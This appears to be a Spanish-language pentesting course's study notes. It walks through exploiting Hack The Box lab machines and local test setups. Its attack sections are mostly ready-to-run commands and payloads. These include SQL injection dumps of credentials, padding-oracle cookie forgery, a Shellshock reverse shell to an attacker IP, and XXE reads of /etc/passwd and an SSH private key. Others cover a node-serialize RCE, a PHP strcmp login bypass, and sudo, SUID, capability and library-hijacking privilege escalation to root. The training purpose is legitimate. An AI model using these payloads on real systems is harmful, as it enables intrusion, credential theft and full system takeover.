+Vemos unas columnas que nos llaman la atención, 'cname' y 'cpass' y queremos mostrar la información (dumpear) de estas columnas:
+-sqlmap -u "http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans" --cookie "PHPSESSID=[cookie]" --D complain --T tbl_customer --C cname,cpass --dump --batch --random-agent --dbms=mysql
+Y de esta forma la herramienta SQLmap de forma automática nos muestra los usuarios y contraseñas de los clientes del servicio web.
+
+
+EXPLOTANDO VULNEREABLIDAD SQL INJECTION - MÉTODO MANUAL
+Ahora vamos a intentar hacer lo mismo pero de forma manual. Primeramente, lo que vamos a hacer es crearnos, a través del servicio MySQL una base de datos para entender como
+funcionan las peticiones SQL:
+-service mysql start -> Iniciamos el servicio.
+-mysql -u root -> A través del usuario root nos conectamos a la base de datos para tener una consola interactiva (MariaDB).
+-show databases -> Para mostrar las bases de datos existentes.
+Para crear una nueva base de datos lo podemos hacer con el siguiente comando:
+-create database [id] -> Se nos creará una base de datos con el nombre de identificador que hayamos elegido, en este caso de ejemplo se llamara 'Colegio'.
+-use Colegio -> Para conectarnos a la BBDD.
+Esta base de datos inicialmente estará vacia, vamos a crear las tablas y columnas, por ejemplo:
+-create table Alumnos(id int(2), username varchar(32), password varchar(32), contacto varchar(32)); -> Con este comando crearemos la tabla Alumnos con 4 columnas
+identificador, nombre de usuario, contraseña y información de contacto, vemos que por cada columna se proporciona el nombre de la columna con su tipo de variable. 
+-describe Alumnos -> Para mostrar la información de la tabla Alumnos.
+La tabla por el momento esta vacia, vamos a insertar datos:
+-insert into Alumnos(id, username, password, contacto) values(1, "administrator", admin123!...", "546584556"); -> Con el comando insert into [tabla] asignamos unos valores
+respectivamente en el orden de columnas que hayamos epecificado. Podemos ir asignando más filas a las columnas si lo vemos necesario.
+Vamos a realizar ahora peticiones para ver si se ha añadido la data:
+-select * from Alumnos; -> Con esta petición nos mostrará toda la información de la tabla.
+Esta información se puede filtrar, por ejemplo:
+-select * from Alumnos where id = 1; -> Nos mostraría solamente la información de las columnas del usuario con id = 1.
+Son estos atributos de la base de datos como el 'id' los que se ven normalmente en la url. Como vimos en la url del exploit anterior view.php?mod=admin&view=repod&id=plans
+y como poniendole una comilla al final ocasionabamos un error en la sintaxi de la base de datos. Estos errores los llamaremos de tipo 'error based' en los que nos
+aprovecharemos del propio error que se nos listará en la página web para listar información privilegiada de la base de datos. Por eso es muy importante sanetizar y nunca 
+confiar en el input del usuario.
+Primeramente, al atacante le interesa saber el numero de columnas que tiene la base de datos, esto lo podemos averiguar mediante el siguiente comando:
+-select * from Alumnos where id = 1 order by 100;-- -; -> Intentamos ordenar en base a la columna 100, si no hay cien columnas nos dará un error (ya que es una injección SQL
+basada en error), hay que ir probando hasta que demos con el numero de columnas exacto ('-- -' lo utilizamos para comentar el resto de la petición SQL y no nos de error).
+Una vez que sabemos el numero de columnas, pongamos que hay 4, haremos una selección de estas columnas para poner una etiqueta a cada columna:
+-select * from Alumnos where id = 1 union select 1,2,3,4;-- -; -> Ponemos las etiquetas al numero de columna respectivamente. 
+Estas etiquetas seremos capaces de verlas en muchos casos, pero y si en vez de enumerar las columnas utilizamos las etiquetas para directamente poner sentencias SQL:
+-select * from Alumnos where id = 1 union select 1,database(),user(),@@version;-- -; -> Seremos capaces de visualizar toda esta información mediante las etiquetas, 
+incluso visualizar archivos locales pero eso ya es una injección SQL más avanzada.
+Con sentecia database() nos muestra el nombre de la base de datos que se esta visualizando pero, a nostros nos interesa saber todas las bases de datos disponibles en el
+sistema, para ello aplicaremos otra sentencia SQL:
+-select * from Alumnos where id = 1 union select 1,schema_name,3,4 from information_schema.schemata;-- -; -> Mostrará todas las bases de datos disponibles en el sistema.
+Ahora queremos averiguar el nombre de las tablas de la base de datos que nos interese, por ejemplo Colegio:
+-select * from Alumnos where id = 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = "Colegio";-- -; -> Para el campo dos vemos que el
+nombre de la tabla es Alumnos. Pues vamos a intentar saber que colmnas tiene esta tabla, de manera similar:
+-select * from Alumnos where id = 1 union select 1,column_name,3,4 from information_schema.columns where table_schema = "Colegio" and table_name="Alumnos";-- -; -> En el
+campo dos nos aparecerán las columnas de la tabla Alumnos. Muchas veces para sanetizar las consultas las palabras 'Colegio' o 'Alumnos' estarán prohibidas pero esto tiene
+fácil solución ya que podemos poner la traducción en hexadecimal (echo "Colegio" | xxd -ps) y obtendremos el mismo resultado.
+Finalmente, lo unico que nos falta por obtener son los datos, en este caso nos interesan dos columnas la de nombre de usuario y la de password, lo podemos hacer de la
+siguiente manera:
+-select * from Alumnos where id = 1 union select 1,concat(username,0x3a,password),3,4 from Colegio.Alumnos;-- -; -> En el campo dos se nos mostrará los datos de las
+columnas especificadas en el concat separado por ':' (0x3a en haxadecimal).
+
+Esto mismo que hemos hecho de forma local lo podríamos replicar en la base de datos Complain de la máquina víctima Rabbit (HTB) injectando la sentencia SQL directamente
+desde la URL. Podemos utilizar schema_name para listar todas las bases de datos y puedo ocurrir un error donde no nos muestre todas las bases de datos, ya que tiene puede
+tener seteado un limite de tablas, para ello podemos utilizar el 'limit' al final de la sentencia para que nos lo vaya filtrando uno a uno. Una vez que obtengamos usuarios
+y contraseñas (encriptadas) algo que podemos hacer es hacer un curl a la URL que nos permite visualizar la información y mediante expresiones regulares y de la utilidad
+'html2text' quedarnos solamente con el output de las contraseñas para poder utilizar herramientas para desencriptarlas.
+
+
+EXPLOTANDO VULNERABILIDAD PADDING ORACLE ATTACK - PADBUSTER
+Para realizar la explotación en este caso utilizaremos la herramienta Padbuster. Nos enfrentamos a la máquina víctima Lazy (HTB) en la que sabemos que tiene un servidor web
+abierto. Como siempre, si nos dan la posibilidad, nos registramos nosotros mismos. Vemos que la cookie de sesión esta encriptada, lo que buscamos con este tipo de
+explotación es saber como esta encriptada para poder replicarla con otros usuarios y poder realizar cookie hijacking. Unos de los métodos de encriptado que debemos tener en
+cuenta es el modo CBC (Cipher Block Chaining), en el que el texto plano se divide en diferentes bloques y se encripta mediante una serie de claves para acabar uniendo los
+diferentes bloques resultando en la cookie desesión encriptada. Primeramente, lo que deberiamos hacer es averiguar si esta máquina es vulnerable a padding oracle attack, 
+para ello, copiaremos la URL en el recurso de registro (login.php) en la herramienta Padbuster y añadiremos nuestra cookie de sesión:
+-padbuster http://10.10.10.18/login.php [cookie] [numero de bytes] -cookie "[cookieType]=[cookie]" -encoding 0 -> Tenemos que saber el numero de bytes anteriormente, 
+existen varias formas para poder saber más o menos el número exacto, pero siempre podemos ir probando hasta que sea injectable. Padbuster lo que tratará de hacer es
+averiguar como se esta computando la cookie de sesión mediante la fuerza bruta, ya que si sé como se computa puedo calcular una nueva cookie. Esta máquina utiliza 2 bloques
+de 8 bytes cada uno y Padbuster nos muestra que la cookie de sesión en texto plano es user=[username]. Entonces, por ejemplo, podríamos intentar computar la cookie de sesión
+del usuario admin, para ello:
+-padbuster http://10.10.10.18/login.php [cookie] [numero de bytes] -cookie "[cookieType]=[cookie]" -encoding 0 -plaintext "user=admin" -> Padbuster nos cumputa una nueva
+cookie de sesión. 
+Ahora si probamos a editar la cookie de sesión veremos que la web nos autentica como administradores, hemos realizado un cookie hijacking.
+
+
+EXPLOTANDO VULNERABILIDAD PADDING ORACLE ATTACK - BURPSUITE BIT FLIPPER
+Vamos a ver como podemos hacer el mismo ataque utilizando BurpSuite con un bit flipper attack. Primeramente, nos vamos a registrar en la web de la máquina víctima Lazy (HTB)
+con un nombre de usuario parecido a 'admin' como, por ejemplo, 'bdmin'. Una vez registrados vamos a interceptar una petición a la misma URL (http://10.10.10.18/login.php) y
+como hemos hecho otras veces con Ctrl + i lo emitimos al intruder para efectuar el ataque. Seleccionamos la cookie y marcamos que es aqui donde queremos hacer nuestro ataque
+seleccionando 'Add $'. Como CBC computa por bloques y el nombre de usuario es muy parecido lo más seguro es que el segundo bloque permanezca inmutable. En el apartado de 
+payloads de BurpSuite seleccionamos 'Bit flipper' como tipo de payload. Por último, vamos al apartado de opciones y añadimos un grep para que se nos añada una nueva columna 
+por cada intento de ataque que haga, lo que nos interesa es el mensaje de log 'You are currently logged in as [username]!', ya que cuando veamos admin habrá generado una 
+cookie como la que tendría el usuario admin haciendo pequeños cambios de bits. Modificamos el campo de cookie de la petición previamente capturada y hacemos fordwarding,
+vemos que nos hemos autenticado como el usuario admin.
+
+
+EXPLOTANDO VULNERABILIDAD SHELLSHOCK
+En este caso vamos ha estar explotando la máquina Beep (HTB) en la que ya vimos que tiene abierto el puerto 1000, asi que accedemos y vemos un panel de login. Probamos a 
+logearnos con cualquier credencial y si vemos que en la URL se ha añadido una extensión .cgi (también podría ser .pl o .sh) se nos tiene que venir a la cabeza el ataque 
+ShellShock. Como realizamos la explotación? Primeramente, nos ponemos por escucha por el puerto 443:
+-bash
+-nc -nlvp 443
+Seguidamente capturaremos una petición a la URL donde nos ha aparecido la extensión con BurpSuite y modificaremos el User-Agent por una sentencia especificamente diseñada
+para romper el sistema y ganar acceso mandandonos una reverse shell por tcp al puerto en escucha -> User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[tu IP]/443 0>&1 
+(extraido de https://blog.cloudflare.com/inside-shellshock). Cuando hagamos el fordward del paquete veremos que hemos ganada acceso a la máquina víctima como usuario
+privilegiado, ya que el servicio lo estaría corriendo root.
+
+
+EXPLOTANDO VULNERABILIDAD XML ENTITY INJECTION (XXE)
+Estamos frente la máquina víctima DevOops (HTB) que si realizamos el scaneo correspondiente veremos que tiene abierto puerto 5000, en este punto aplicariamos fuzzing sobre
+este puerto y veriamos que hay un directorio 'upload' donde podemos subir archivos con extructura XML. Si probamos a subir un fichero XML con la estructura que nos
+especifican elements, Author, Subject y Content vemos que nos estructura los campos y nos lo muestra por pantalla, aqui es donde nos damos cuenta que es vulnerable a este
+tipo de explotación, ya que mediante a entidades podremos visualizar archivos locales del sistema como el /etc/passwd:
+	
+	<!DOCTYPE foo [
+	    <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+	<elements>
+	    <Author>&xxe;</Author>
+	</elements>
+
+Para ganar acceso al sistema podría suponer que el usuario 'roosa' (quien gestiona este directorio del sistema) en el directorio .ssh tiene una id_rsa privada:
+
+	<!DOCTYPE foo [
+	    <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
+	<elements>
+	    <Author>&xxe;</Author>
+	</elements>
+
+Si volvemos a subir el archivo vemos como si nos muestra la clave privada, la copiamos y la ponemos un fichero local 'id_rsa'. Importante que este fichero tenga el permiso
+600 para que funcione correctamente:
+-chmod 600 id_rsa
+Y lo que intentamos hacer es conectarnos via ssh a la máquina víctima:
+-shh -i id_roosa roosa@10.10.10.91 -> Mediante el paramentro -i le especificamos la clave privada que tenemos en el archivo y nos conectamos como el uruario roosa a la IP
+de la máquina. Todo esto sin especificar contraseña, ya que en el directorio .shh hay un authorized_kays con la clave privada de roosa ya autorizada para que cualquiera
+que disponga de esta clave se pueda autenticar.
+
+
+EXPLOTANDO VULNERABILIDAD DOMAIN ZONE TRANSFER
+Un ataque de trasnferencia de zona se puede hacer mediante la herramienta Dig, la cual te permite emitir peticiones a nivel DNS:
+-dig @10.10.10.123 friendzone.red ns,mx -> Especificando la IP y el nombre del dominio lo que va a hacer es, por ejemplo, listar los servidores ns o mx (correo). Pero para
+explotar esta vulnerabilidad utilizaremos el parametro axfr:
+-dig @10.10.10.123 friendzone.red axfr -> Si el dominio es vulnerable esto permitirá obtener un listado de sub-dominios validos para el dominio principal.
+Lo que podemos hacer con estos sub-dominios es añadirlos al fichero /etc/hosts y atender a la respuesta del lado del servidor a la hora de accder desde un navegador web para
+ver si se lista alguna otra página con información privilegiada.
+
+
+EXPLOTANDO VULNERABILIDADES DE TIPO INSECURE DESARIALIZATION
+En este caso vamos a estar explotando la máquina Celestial (HTB). Sabemos que el puerto 3000 esta abierto, en el cual corre un servicio web donde solo podemos ver el
+siguiente texto "Hey Dummy 2 + 2 is 22". Primeramente, con BurpSuite difiniremos el Scope añadiendo IP:Port para que filtre toda la información que no provenga de esta URL.
+Interceptamos la petición y vemos algo que nos llama la atención, en el parámetro cookie tenemos profile=ey... que se asemeja a base64. Entoces lo que podemos hacer es
+seleccionar la cookie y enviarla al decoder o decodificarlo en consola. Al decodificar podemos ver información en claro como, por ejemplo, username":"Dummy. 
+Podemos probar a cambiar el username, por ejemplo, username":"Raul, volver a codificar la cookie en base64 y subtituirla por la que habíamos interceptado con BurpSuite. 
+Hacemos el forwarding y vemos que el texto del servidor web ha cambiado "Hey Raul 2 + 2 is 22". Esto nos tiene que hacer pensar que puede que los datos esten viajando de 
+forma serializada y el servidor una vez que recibe la petición los deserializa. Necesitaremos las herramientas nodejs y npm:
+-apt install nodejs npm -y
+Y con npm nos instalaremos node-serialize:
+-npm install node-serialize
+Y tendremos que crearnos el siguiente script:
+
+	var y = {
+  	  rce : function(){
+	  require('child_process').exec('', function(error, stdout, stderr) { console.log(stdout) });
+	  }(),
+	}
+	var serialize = require('node-serialize');
+	console.log("Serialized: \n" * serialize.serialize(y));
+
+Este script lo que nos va a permitir es serializar data, por tanto, la idea como atacante es que cuando el servidor haga una deserialización de los datos, al no estar
+protegido, logremos introducir comandos. Por ejemplo, con node podríamos obtener una cadena serializada del script anterior para que cuando el servidor deserialize la 
+cadena, ejecute el comado whoami:
+-node serialize.js
+Entonces el objetivo es crear una data maliciosa serializada para colocar en el campo profile de la cookie para que posteriormente cuando la máquina lo deserialize, en el
+caso que confie en nuestro imput de usuario (NO sanitización), nos va a ejecutar nuestros comandos a nivel de sistema. Para ganar acceso al sistema aprovechando este tipo
+de explotación podemos utilizar herramientas como 'nodejsshell.py' que nos proporciona la data que debe ser serializada para entablar una reverse-shell a bajo nivel.
+Toda esta data serializada tiene que viajar en base64 en el campo profile:
+-cat data | base64 -w 0; echo
+Ahora solamente tendremos que ponernos en escucha por el puerto 443 en una bash y copiar la data obtenida en el campo profile, de la cookie que hemos interceptado en un 
+principio, y hacer forwarding del paquete. Y veremos que hemos obtenido una shell sobre la máquina víctima.
+
+
+EXPLOTANDO VULNERABILIDAD TYPE JUGGLING SOBRE PANEL LOGIN
+Para explotar esta vulnerabilidad vamos a crear un script en php, en el cual vamos a simular un panel login de una página web cualquiera, que contenga este tipo de
+vulnerabilidad por la forma en que esta programada. Antes de nada vamos a necesitar también poner en marcha el servicio apache para ir visualizando todo lo que vayamos 
+haciendo en el script:
+-service apache2 start
+Lo que nos interesa para ejecutar el type juggling es definirnos una estructura en php que me valide si estoy escribiendo bien el usuario y la contraseña, esto lo haremos
+comprobando que el campo Usuario y Contraseña que viaja por POST es igual al nombre de usuario y contraseña de un usuario concreto: 
+
+	<html>
+	    <font color="red"><h1><marquee>Secure Login Page</marquee></h1></font>
+	    <hr>
+	    <body style="background-color:powderblue;">
+		<center><form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
+		    Usuario: <input type="text" name="usuario" id="usuario" size="30">
+	    	    &nbsp;
+		    Password: <input type="password" name="password" id="password" size="30">
+		    <input type="submit" value="Login">
+		</form></center>
+	    <?php
+		$USER = "admin";
+		$PASSWORD = "4st4p4ssw0rd!3simp0siblederomper!$2020..";
+
+		if(isset($_POST['usuario']) && isset($_POST['password'])){
+		    if($_POST['usuario'] == $USER){
+			if(strcmp($_POST['password'], $PASSWORD) == 0){
+		            echo "Acceso exitoso!";
+			} else { echo "La password es incorrecta!"; }
+		    } else { echo "El usuario es incorrecto!"; }
+		}
+	    ?>
+	    </body>
+	</html>
+
+Teniendo ya este script como atacante podría probar enumerar usuarios potenciales, por ejemplo, mediante fuzzing:
+-wfuzz -c -t 400 --hh=429 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&password=test' https://@IP/login.php -> Con el parámetro -d 
+indicamos que se esta tramitando data por POST con un usuario que desconocemos, por lo que vamos a buscar usuarios potenciales aplicando fuzzing en el campo Usuario. Con
+el parámetro -hh ocultamos los resultados con 429 carácteres. Vemos que podemos encontrar el usuario 'admin' fácilmente pero, no sabemos la contraseña y esta puede ser muy
+compleja, donde un ataque por diccionario no nos funcionaría. No hace falta saberse la contraseña por que cuando con strcmp entablas comparativas se puede ocasionar una 
+vulnerabilidad type juggling. Podemos explotar esta vulnerabilidad con el siguiente comando:
+-curl -s -X POST --data 'usuario=admin&password[]=contraseña' http://@IP/login.php | html2text-> A través de POST tramitamos data donde esta data va a ser el nombre de 
+usuario=admin y el password[]=contraseña, pero ojo la explotación esta en poner los corchetes antes del '=' que nos darán acceso sea cual sea la contraseña. Sobre el output 
+aplicamos la herrramienta html2text para interpretarlo mejor.
+
+
+ABUSO DE SUDOERS PARA ESCALAR PRIVILEGIOS
+Una forma de poder escalar privilegios con un usuario no privilegiado es, mediante ingenieria social, conseguir que el administrador del sistema te ponga en el fichero 
+/etc/sudores para realizar cualquier cosa sin importancia, puede ser utilizar zip para comprimir archivos por ejemplo. Ejecutando el siguiente comando podremos ganar acceso
+al sistema como usuario privilegiado:
+sudo zip test /etc/hosts -T -TT 'sh #' -> Vulnerabilidad extraida de https://gtfobins.github.io/gtfobins/zip/#sudo
+
+
+ABUSO DE PERMISOS SUID PARA ESCALAR PRIVILEGIOS
+Como vimos al principio del curso podemos escalar privilegios aprovechandonos de los permisos SUID. Cualquier binario, que tenga este nivel de privilegios, podrá ser 
+ejecutado por cualquiera como si fuera el usuario propietario. Por ejemplo, como un usuario no privilegiado podemos probar a buscar en el sistema binarios que tengan este 
+bit SUID activo:
+-find \-perm -4000 2>/dev/null
+Encontramos un binario llamado /usr/bin/timeout que nos puede llamar la atención. En el recurso https://gtfobins.github.io podemos probar a buscar timeout. Vemos que es 
+posible una explotación si tiene permisos SUID:
+-timeout 7d /bin/sh -p -> Nos aprovechamos de que la utilidad se ejecuta como root para injectar comandos y ganar acceso privilegiado al sistema.
+
+
+ABUSO DE CAPABILITIES PARA ESCALAR PRIVILEGIOS
+Como vimos al principio del curso podemos abusar de las capabilities para convertirnos en root, este caso utilizamos el binario php7.3:
+-setcap cap_setuid+ep /usr/bin/php7.3 -> Le asignamos a php7.3 la capability del setuid+ep (utilizada más adelante para poder poner el setuid(0)).
+-php7.3 -r "posix_setuid(0); system('/bin/bash');"  -> Le indiacamos que queremos operar con el id=0 (root) y seguidamente, atraves de otro atributo de os, indicamos que 
+queremos hacer una llamada al sistema y abrir una bash.
+
+
+
+LIBRARY HIJACKING
+La idea de library hijacking es muy parecida a la de path hijacking pero con las librerias de python. En python el orden de prioridad de path a la hora de, por ejemplo,
+importar rutas parte siempre del directorio actual y eso tiene sus riesgos. Esto lo podemos ver haciendo:
+-python
+-import sys
+-print sys.path
+Para explotar esta vulnerabilidad lo que podemos hacer es crearnos un archivo 'example.py' donde este importará una libreria llamada hashlib:
+example.py:
+
+	#!/usr/bin/python
+
+	import hashlib, sys
+
+	if len(sys.argv) != 2:
+	    print "Ha habido un error...\n"
+	    sys.exit(1)
+
+	if __name__ == '__main__':
+	    palabra = sys.argv[1]
+
+	    md5 = hashlib.md5(palabra).hexdigest()
+
+	    print md5
+
+Con un locate hashlib.py podemos ver donde se encuentra la libreria en el sistema. El objetivo sería modificar una libreria del sistema para que cuando otros programas la
+importen utilicen la modificada. Como hacemos esto? Creamos un archivo en el mismo directorio de trabajo, ya que es el que va a tener prioridad, que se llame exactamente 
+como la libreria, en este caso hashlib.py para realizar un hijacking de la libreria:
+hashlib.py:
+
+	import os
+
+	os.setuid(0)
+	os.system("/bin/bash")
+
+De esta manera cuando se importe la libreria hashlib en el archivo example.py lo que estaremos haciendo es asignarnos privilegios de root y lanzarnos una shell.
+
+
+ABUSO DEL KERNEL PARA ESCALAR PRIVILEGIOS
+En algunos casos podemos aprovecharnos de un kernel con una versión antigua para escalar privilegios. Para poder saber la versión del kernel lo podemos hacer con el 
+siguiente comando:
+-uname -a -> Tendremos que mirar si la versión es antigua, y en el caso de que lo sea, si tiene vias potenciales de explotación para escalar privilegios. Buscando en el 
+navegador, por ejemplo, '[versión] exploit kernel'.
+En el caso de ejemplo, encontramos un exploit en c# que crea un usuario privilegiado (subsituyendo a root), lo añade al /etc/passwd, le asigna una contraseña que nosotros
+le indiquemos y la injecta encriptada (en des(unix)). Una vez ejecutado el exploit migramos al usuario privilegiado creado y veremos que su uid=0 (root).
+
+
+RECONOCIMIENTO DEL SISTEMA
+Cuando comprometemos un sistema, es recomendable utilizar herramientas de reconocimiento que nos efectuan enumeraciones a nivel de sistema. En linux por ejemplo hay una 
+llamada 'linux-smart-enum' (https://github.com/diego-treitos/linux-smart-enumeration). acausndo ejecutemos la herramienta va a empezar a enumerar todo el sistema en busca
+de vias potenciales de escalar privilegios.
+-./lse.sh -l 2 -> Con el parámetro -l podemos indicarle el nivel de representación de los datos encontrados, es decir, que no solamente nos indique si ha encontrado algo o
+no sinó que también nos muestre que ha encontrado.
